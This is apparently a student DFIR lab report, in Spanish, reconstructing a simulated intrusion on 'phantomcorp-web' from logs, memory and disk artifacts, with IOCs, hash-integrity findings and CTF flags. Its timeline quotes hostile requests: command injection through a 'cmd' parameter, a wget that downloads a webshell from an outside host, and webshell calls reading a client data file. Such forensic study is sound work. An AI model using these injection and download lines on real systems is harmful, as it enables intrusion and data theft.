# Informe forense — Incidente PhantomCorp (`phantomcorp-web`)

**Grupo:** 02

**Integrantes:**
- Jimena Soledad Romero — @Jimena-Romero
- Hebe Del Lourdes Milanesio — @hebemilanesio1
- Juan Cruz Toranzo — @JuanToranzo
- Damaris Torres — @damaris412

**Fecha:** 23/10/2026

**Sistema afectado:** `phantomcorp-web` (`10.0.0.5`)

**Tipo de incidente:** posible intrusión, ejecución remota de comandos y posible acceso no autorizado a información.

## 1. Resumen del incidente

Durante el análisis de la evidencia del caso PhantomCorp se identificó actividad sospechosa proveniente de la dirección IP `185.220.101.42`.

Se ejecutó el script `timeline.py` sobre `logs/access.log`, filtrando por esa dirección IP. El programa devolvió 16 eventos comprendidos entre las 02:14:03 y las 02:23:15 UTC del 5 de septiembre de 2026.

Los registros muestran una etapa inicial de reconocimiento y enumeración de rutas, seguida de solicitudes al inicio de sesión del portal de Recursos Humanos. Posteriormente aparecen solicitudes al endpoint `/api/reporte` con parámetros que intentan ejecutar comandos, una solicitud para descargar un archivo hacia el directorio de uploads y consultas posteriores a una ruta compatible con una webshell.

El último evento de la línea de tiempo solicita leer el archivo `/app/priv/clientes.db.txt`. Esta solicitud es indicio de un posible intento de acceso a información sensible; para confirmar si la lectura fue exitosa, es necesario revisar los códigos de respuesta y los registros asociados.

El análisis de integridad permitió establecer que ocho archivos coinciden con sus hashes de referencia al comparar los bytes registrados en Git, mientras que `logs/auth.log` presenta una discrepancia que requiere investigación adicional.

## 2. Metodología y evidencia analizada

Se utilizó el material provisto para el laboratorio, organizado en las siguientes fuentes:

- `logs/access.log`: solicitudes HTTP asociadas a la actividad investigada.
- `logs/auth.log`: registros de autenticación cuya integridad presenta una discrepancia.
- `disco/listado.txt`: inventario de archivos de la evidencia de disco.
- `disco/var/www/uploads/shell.php.evidencia.txt`: artefacto de referencia asociado a la webshell.
- `disco/etc/passwd.snippet`: fragmento de la base de usuarios del sistema.
- `memoria/pslist.txt`: información de procesos identificados en la captura.
- `memoria/netstat.txt`: información de conexiones de red observadas.
- `memoria/bash_history.txt`: comandos recuperados del historial de shell.
- `memoria/lsof.txt`: información sobre archivos abiertos por procesos.
- `evidencia.sha256`: manifiesto con los hashes SHA-256 de referencia.

Para construir la línea de tiempo se ejecutó el siguiente comando desde el directorio `entregas/lab11/grupo02/src`:

```bash
python timeline.py ../../../../labs/lab11-forensia/caso/logs/access.log --ip 185.220.101.42
```

El script informó un total de **16 eventos** correspondientes a la dirección IP investigada.

La investigación se basó en la salida del script y en los artefactos proporcionados para el laboratorio. Las conclusiones se distinguen entre eventos observados directamente e hipótesis que requieren corroboración con otras fuentes.

## 3. Línea de tiempo reconstruida

Los horarios corresponden a la salida del script y están expresados en UTC.

| Hora | Método | Ruta o solicitud | Clasificación |
|---|---|---|---|
| 02:14:03 | GET | `/` | RECON |
| 02:14:19 | GET | `/robots.txt` | RECON |
| 02:14:20 | GET | `/admin` | ENUM |
| 02:14:20 | GET | `/login` | EXPLOIT |
| 02:14:21 | GET | `/backup` | ENUM |
| 02:14:21 | GET | `/portal-rrhh` | ENUM |
| 02:14:22 | GET | `/uploads` | ENUM |
| 02:16:40 | POST | `/portal-rrhh/login` | EXPLOIT |
| 02:16:58 | POST | `/portal-rrhh/login` | EXPLOIT |
| 02:17:22 | POST | `/portal-rrhh/login` | EXPLOIT |
| 02:17:41 | GET | `/backup/rrhh.conf` | ENUM |
| 02:18:10 | GET | `/api/reporte?token=phantom-api-7c1e&cmd=id` | RCE |
| 02:18:33 | GET | `/api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p` | RCE |
| 02:19:02 | GET | `/api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php` | WEBSHELL |
| 02:19:48 | GET | `/uploads/shell.php?c=whoami` | WEBSHELL |
| 02:23:15 | GET | `/uploads/shell.php?c=cat%20/app/priv/clientes.db.txt` | WEBSHELL |

### Interpretación de los eventos

1. **Reconocimiento:** las solicitudes a `/` y `/robots.txt` son compatibles con una exploración inicial del sitio.
2. **Enumeración:** se consultaron rutas como `/admin`, `/backup`, `/portal-rrhh` y `/uploads`.
3. **Intentos de acceso al portal:** aparecen tres solicitudes POST a `/portal-rrhh/login`. La salida del script no permite determinar por sí sola si la autenticación tuvo éxito ni conocer el contenido de los formularios.
4. **Posible ejecución remota de comandos:** las solicitudes a `/api/reporte` incluyen el parámetro `cmd`. La petición `cmd=id` intenta ejecutar un comando del sistema; la siguiente solicita escribir una cadena identificada como flag en un archivo temporal.
5. **Intento de descarga de una webshell:** a las 02:19:02, el parámetro `cmd` contiene un comando `wget` que intenta descargar `s.php` desde `45.13.37.7` y guardarlo como `/var/www/uploads/shell.php`.
6. **Consultas posteriores a la ruta de la webshell:** a las 02:19:48 se solicita `/uploads/shell.php?c=whoami` y a las 02:23:15 se solicita `/uploads/shell.php?c=cat%20/app/priv/clientes.db.txt`. Estas solicitudes son compatibles con intentos de ejecutar comandos y acceder a información, pero su éxito debe corroborarse con los registros y artefactos disponibles.

Las clasificaciones RECON, ENUM, EXPLOIT, RCE y WEBSHELL corresponden a la salida del script. Para confirmar detalles de autenticación, códigos HTTP y resultados de las solicitudes se deben consultar las líneas originales de `access.log` y las fuentes complementarias.

## 4. Indicadores de compromiso (IOC)

| Indicador | Valor | Fuente y estado |
|---|---|---|
| IP de origen investigada | `185.220.101.42` | Observada en la línea de tiempo de `logs/access.log` |
| Servidor externo solicitado | `45.13.37.7` | Aparece en el comando `wget` de `access.log` |
| Token del endpoint | `phantom-api-7c1e` | Presente en las solicitudes a `/api/reporte` |
| Endpoint sospechoso | `/api/reporte` | Observado en `logs/access.log` |
| Ruta de destino de la descarga | `/var/www/uploads/shell.php` | Indicada en el comando `wget` |
| Archivo solicitado posteriormente | `/app/priv/clientes.db.txt` | Parámetro de la solicitud de las 02:23:15 |
| Binario relacionado con una posible escalada | `/usr/local/bin/system-check` | Requiere corroboración directa en los artefactos correspondientes |
| Dirección y puerto de posible conexión externa | `45.13.37.7:4444` | Atribuido a `memoria/netstat.txt`; verificar el contenido original |
| Usuario sospechoso | `phantom-svc` | Atribuido a `disco/etc/passwd.snippet`; verificar el contenido original |

Los indicadores de la tabla tienen distinto grado de corroboración. Las solicitudes HTTP y los valores que contienen aparecen en la línea de tiempo observada. Los elementos atribuidos a memoria y disco deben confirmarse mediante la inspección directa de esos archivos antes de tratarlos como hallazgos establecidos.

## 5. Integridad y cadena de custodia

Se verificó la integridad de los archivos utilizando el manifiesto `evidencia.sha256`, que contiene los hashes SHA-256 de referencia para los artefactos del caso.

La primera comprobación se realizó sobre los archivos de la copia de trabajo de Windows mediante:

```bash
shasum -a 256 -c evidencia.sha256
```

En esa comprobación, los nueve archivos presentaron discrepancias. Al inspeccionar los finales de línea mediante `git ls-files --eol`, se observó que Git registra los archivos con finales de línea LF (`i/lf`), mientras que las copias locales utilizan CRLF (`w/crlf`). Esta conversión modifica los bytes de los archivos de texto y puede cambiar el resultado de los hashes SHA-256.

Para distinguir las diferencias de formato de otras discrepancias, se calcularon los hashes directamente sobre los bytes de los archivos registrados en Git (`HEAD`) y se compararon con los valores del manifiesto. El resultado fue:

**Ocho archivos coincidentes con el manifiesto:**

- `disco/etc/passwd.snippet`
- `disco/listado.txt`
- `disco/var/www/uploads/shell.php.evidencia.txt`
- `logs/access.log`
- `memoria/bash_history.txt`
- `memoria/lsof.txt`
- `memoria/netstat.txt`
- `memoria/pslist.txt`

**Un archivo no coincidente:**

- `logs/auth.log`

En consecuencia, los resultados de los ocho primeros archivos son consistentes con que las discrepancias observadas en la copia local se deban a la conversión de finales de línea. En cambio, `logs/auth.log` no coincide con el hash de referencia incluso al comparar los bytes almacenados en Git. El hash del contenido de `HEAD` es `7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab`, mientras que el manifiesto registra `0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff`.

Esta discrepancia requiere investigar el origen del valor de referencia y la procedencia del archivo. Por sí sola, no permite determinar cuándo ni por quién se produjo, ni demostrar una modificación maliciosa.

Por precaución, `logs/auth.log` debe tratarse como un artefacto cuya integridad no ha podido validarse contra el manifiesto. Su contenido debe correlacionarse con `access.log`, los artefactos de memoria y las demás fuentes disponibles. Las conclusiones que dependan exclusivamente de información de `auth.log` deben presentarse con la correspondiente limitación.

La flag de custodia identificada para el laboratorio es `FLAG{dfir_custodia_alterada}`. Su identificación se registra como resultado del ejercicio, mientras que la discrepancia de hashes se documenta como hallazgo técnico independiente.

## 6. Alcance e impacto

La línea de tiempo muestra una solicitud para leer `clientes.db.txt` mediante la ruta `/uploads/shell.php`. Este comportamiento es compatible con un intento de acceder a información sensible, pero la solicitud por sí sola no demuestra que la lectura se haya completado ni que los datos hayan sido transferidos fuera del sistema.

El material original del caso describe una respuesta de 48.210 bytes asociada a esa solicitud. Este dato debe contrastarse con los registros originales antes de utilizarlo como confirmación del volumen de información obtenido.

Los artefactos de memoria y el historial de comandos pueden aportar elementos para investigar una posible conexión externa, preparación de datos o transferencia de información. Para confirmar una exfiltración se necesita correlacionar esos artefactos con evidencia que permita establecer qué datos se transfirieron y por qué conexión.

Los artefactos del caso también señalan posibles mecanismos de escalada de privilegios y persistencia. Esos hallazgos deben verificarse mediante la inspección directa de los archivos de disco, los procesos y los registros disponibles.

La discrepancia de integridad en `logs/auth.log` constituye una limitación para la reconstrucción de los eventos de autenticación. Por ese motivo, las conclusiones relacionadas con esos eventos deben apoyarse en otras fuentes cuando sea posible.

## 7. Contención y recomendaciones

1. **Aislar el sistema afectado:** limitar las conexiones de red del host comprometido mientras se preserva la evidencia necesaria para la investigación.
2. **Investigar la infraestructura externa:** revisar las comunicaciones con `45.13.37.7`, incluidos los puertos identificados en los artefactos, y aplicar bloqueos de acuerdo con las políticas de la organización.
3. **Revisar el endpoint vulnerable:** analizar `/api/reporte`, restringir su acceso y evitar que parámetros de solicitudes HTTP se interpreten directamente como comandos del sistema.
4. **Auditar el portal de Recursos Humanos:** revisar el mecanismo de autenticación de `/portal-rrhh`, validar los controles de acceso y comprobar que las consultas a bases de datos utilicen parámetros seguros.
5. **Investigar posibles permisos SUID:** inspeccionar `/usr/local/bin/system-check` y verificar si el binario necesita esos privilegios. Retirar permisos innecesarios y corregir cualquier comportamiento inseguro.
6. **Buscar persistencia:** revisar usuarios, tareas programadas, claves SSH autorizadas y archivos ejecutables o scripts creados durante el intervalo investigado.
7. **Rotar credenciales y tokens:** reemplazar el token `phantom-api-7c1e` y las credenciales que pudieran haber quedado expuestas, previa evaluación del alcance del incidente.
8. **Preservar la evidencia:** mantener copias de solo lectura, registrar hashes y documentar cada operación sobre los archivos. No sobrescribir el manifiesto original.
9. **Evaluar el impacto sobre los datos:** determinar qué información pudo haber sido consultada o transferida y aplicar el procedimiento de notificación que corresponda.
10. **Recuperar desde una base confiable:** una vez preservada la evidencia y evaluado el alcance, considerar la reinstalación del sistema desde una imagen confiable y la aplicación de las correcciones necesarias.

## 8. Preguntas de análisis

### P1. ¿Por qué se captura la RAM antes que el disco?

La memoria RAM contiene información volátil, como procesos activos, conexiones de red y datos de sesiones. Esa información puede perderse al apagar o reiniciar el equipo. Por eso, cuando el procedimiento y las condiciones lo permiten, se prioriza capturar la memoria antes de realizar acciones que puedan destruir esos datos. La evidencia de disco suele persistir después del apagado.

### P2. ¿Cómo se detectó la discrepancia de integridad de `auth.log` y por qué importa?

La verificación inicial mediante `shasum -a 256 -c evidencia.sha256` mostró discrepancias en los nueve archivos de la copia de trabajo de Windows. Al inspeccionar los finales de línea con `git ls-files --eol`, se observó que Git registra los archivos con LF, mientras que la copia local utiliza CRLF.

Para distinguir este efecto de una discrepancia real, se compararon los hashes del manifiesto con los bytes de los archivos registrados en Git (`HEAD`). Ocho archivos coincidieron y `logs/auth.log` no coincidió.

La discrepancia requiere investigación adicional. Por sí sola, no permite determinar cuándo ni por quién se produjo una eventual modificación.

### P3. ¿Cómo se correlaciona un evento entre logs, disco y memoria?

Un ejemplo es el intento de descarga de la webshell a las 02:19:02 UTC:

- **Log:** `access.log` contiene una solicitud a `/api/reporte` cuyo parámetro `cmd` intenta descargar `s.php` desde `45.13.37.7` y guardarlo como `/var/www/uploads/shell.php`.
- **Disco:** `disco/var/www/uploads/shell.php.evidencia.txt` es un artefacto asociado a la webshell que puede compararse con la ruta y el contenido esperados.
- **Memoria:** `memoria/netstat.txt` y `memoria/pslist.txt` pueden utilizarse para investigar las conexiones y procesos relacionados, si su contenido respalda esa relación.

La correlación entre las fuentes permite evaluar si la solicitud registrada, la actividad de red y el artefacto de disco corresponden al mismo evento. Cada vínculo debe sustentarse en los datos originales.

### P4. ¿Por qué puede recuperarse información de una sesión aunque se intente borrar el historial?

El comando `history -c` afecta el historial de Bash de la sesión, pero no garantiza que desaparezcan todos los rastros de actividad. Pueden persistir otros registros y artefactos, incluidos datos presentes en una captura de memoria o información registrada por procesos y conexiones de red. En este caso, `memoria/bash_history.txt` es una de las fuentes provistas para estudiar los comandos ejecutados.

### P5. ¿Por qué un analista forense necesita comprender las técnicas de ataque?

Ese conocimiento ayuda a interpretar los eventos técnicos y relacionarlos con posibles acciones de un atacante. Por ejemplo, entradas manipuladas en un formulario pueden justificar una investigación de SQL injection; un endpoint que recibe comandos puede indicar una posible ejecución remota; y un proceso con privilegios elevados puede justificar una investigación de escalada de privilegios. Las conclusiones deben apoyarse en la evidencia disponible y en la correlación entre fuentes.

## 9. Conclusión

El análisis de `access.log` mediante `timeline.py` identificó 16 eventos asociados a la IP `185.220.101.42`, desde solicitudes compatibles con el reconocimiento inicial hasta solicitudes que intentan utilizar una webshell para consultar información sensible.

La línea de tiempo permite reconstruir una secuencia de actividad sospechosa y establecer indicadores para continuar la investigación. Sin embargo, los registros disponibles por sí solos no permiten confirmar el éxito de todas las solicitudes, la exfiltración efectiva de datos ni la totalidad de los mecanismos de escalada de privilegios o persistencia.

La verificación de integridad permitió explicar las discrepancias iniciales de ocho archivos por la conversión de finales de línea entre la copia de Windows y los bytes registrados en Git. `logs/auth.log` continúa sin coincidir con el hash de referencia, por lo que su contenido debe interpretarse con precaución y contrastarse con otras fuentes.

El estado del laboratorio se comprobó mediante `./ctf status 11`, que informó los cinco objetivos como completados. La entrega final debe incluir este informe, el script de línea de tiempo y la captura del estado del CTF si así lo requieren las instrucciones del laboratorio.